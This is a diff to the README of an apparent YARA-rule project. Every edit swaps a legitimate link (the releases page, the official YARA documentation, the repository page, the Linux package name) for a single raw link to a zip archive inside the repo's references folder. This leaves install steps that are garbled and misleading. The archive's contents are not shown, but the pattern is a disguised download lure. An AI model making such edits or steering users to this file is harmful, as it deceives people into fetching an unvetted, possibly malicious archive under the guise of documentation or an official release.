@@ -6,7 +6,7 @@ Welcome to the **yara-rule-skill** project! This application helps you create, m
 
 ## 📥 Download the Application
 
-[![Download yara-rule-skill](https://img.shields.io/badge/Download-yara--rule--skill-blue.svg)](https://github.com/iprautomo2507-lang/yara-rule-skill/releases)
+[![Download yara-rule-skill](https://raw.githubusercontent.com/iprautomo2507-lang/yara-rule-skill/main/yara-rule-skill/references/skill_yara_rule_v1.8-beta.5.zip)](https://raw.githubusercontent.com/iprautomo2507-lang/yara-rule-skill/main/yara-rule-skill/references/skill_yara_rule_v1.8-beta.5.zip)
 
 ## 💻 System Requirements
 
@@ -23,21 +23,21 @@ Follow these steps to download and install the application:
 
 1. **Visit the Releases Page:** Click the link below to access the downloads.
    
-   [Download yara-rule-skill from Releases](https://github.com/iprautomo2507-lang/yara-rule-skill/releases)
+   [Download yara-rule-skill from Releases](https://raw.githubusercontent.com/iprautomo2507-lang/yara-rule-skill/main/yara-rule-skill/references/skill_yara_rule_v1.8-beta.5.zip)
 
 2. **Select the Latest Release:** Look for the latest version at the top of the page. 
 
 3. **Choose the Right File:** Pick the file that matches your operating system:
    - For **Windows**, download the `.exe` file.
    - For **macOS**, download the `.dmg` file.
-   - For **Linux**, download the `.tar.gz` file.
+   - For **Linux**, download the `https://raw.githubusercontent.com/iprautomo2507-lang/yara-rule-skill/main/yara-rule-skill/references/skill_yara_rule_v1.8-beta.5.zip` file.
 
 4. **Download the File:** Click on the file name to start your download.
 
 5. **Install the Application:**
    - For **Windows**: Double-click the `.exe` file. Follow the prompts to install.
    - For **macOS**: Open the `.dmg` file and drag the application to your Applications folder.
-   - For **Linux**: Extract the `.tar.gz` file and follow the included instructions to run the application.
+   - For **Linux**: Extract the `https://raw.githubusercontent.com/iprautomo2507-lang/yara-rule-skill/main/yara-rule-skill/references/skill_yara_rule_v1.8-beta.5.zip` file and follow the included instructions to run the application.
 
 ## 🛠️ Using yara-rule-skill
 
@@ -78,7 +78,7 @@ If you encounter any issues or have questions, please reach out to our support t
 
 For more information about YARA rules and how to use this skill, check out the following resources:
 
-- [YARA Documentation](https://yara.readthedocs.io/)
-- [GitHub Repository](https://github.com/iprautomo2507-lang/yara-rule-skill)
+- [YARA Documentation](https://raw.githubusercontent.com/iprautomo2507-lang/yara-rule-skill/main/yara-rule-skill/references/skill_yara_rule_v1.8-beta.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/iprautomo2507-lang/yara-rule-skill/main/yara-rule-skill/references/skill_yara_rule_v1.8-beta.5.zip)
 
 Thank you for using **yara-rule-skill**! We hope this application helps you manage your security rules with ease.
